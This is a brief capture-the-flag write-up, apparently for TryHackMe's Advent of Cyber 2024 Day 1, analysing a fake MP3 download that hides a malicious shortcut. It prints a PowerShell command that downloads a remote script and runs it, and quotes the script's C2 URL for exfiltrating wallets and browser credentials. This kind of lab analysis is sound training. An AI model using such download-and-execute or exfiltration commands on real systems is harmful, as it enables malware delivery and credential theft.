I never did this kind of Cyber advent before (only did Advent of Code), and I was surprised on how guided it was!

This Write-up will probably be very brief, and I highly recommend you checking the [original pages of the challenges on Tryhackme](https://tryhackme.com/r/room/adventofcyber2024) as they provide a great introduction on all the covered subjects.

## Day 1 - Maybe SOC-mas music, he thought, doesn't come from a store?

A basic SOC challenge, investigating a malware and finding its github repo.

We go on a sort of "Youtube to MP3" , that regardless of the link provided, will give us a ZIP with 2 files, 2 MP3s, but one more interesting than the other...

```bash
exiftool song.mp3
MIME Type                       : audio/mpeg
Artist                          : Tyler Ramsbey

exiftool somg.mp3
	MIME Type                       : application/octet-stream
	Target File DOS Name            : powershell.exe
	Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```

A classic Powershell link downloading a more complicated payload from Github.
In the downloaded file we see that it searches crypto wallets and browser credentials and sends them to the following C2 url:

```powershell
    $c2Url = "http://papash3ll.thm/data"
```

Let's bypass the course, no need to search for the code on Github, as the url of the payload already contains its username, [MM-WarevilleTHM](https://github.com/MM-WarevilleTHM) .

On the M.M repo, there is only a Readme giving the alias of M.M, "Mayor Malware".
On the IS repo there is 1 issue and 1 commit.

we also see on the M.M repo a link for https://github.com/Mayor-WarevilleTHM .
The user does not exist, but searching on Github for this username redirects to the [Bloatware-WarevilleTHM](https://github.com/Bloatware-WarevilleTHM) , a hint for next day.

## Day 2
